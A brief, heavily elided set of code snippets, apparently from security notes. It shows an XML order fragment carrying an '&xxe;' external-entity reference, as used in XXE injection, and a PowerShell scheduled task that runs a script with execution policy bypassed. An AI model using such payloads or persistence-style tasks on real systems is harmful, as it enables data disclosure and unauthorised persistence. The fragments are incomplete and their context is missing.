...
- ```xml
  ...
  <order><quantity>
  </quantity><item>&xxe;</item><address>
  </address></order>
  ```
- ```xml
  <?xml version = "1.0"?>
...
- ```powershell
  ...
  $taskAction = New-ScheduledTaskAction -Execute "PowerShell" -Argument "-NoProfile -ExecutionPolicy Bypass -File 'C:\Log-Management\rv.ps1' -Output 'HTML'" -WorkingDirectory 'c:\scripts'
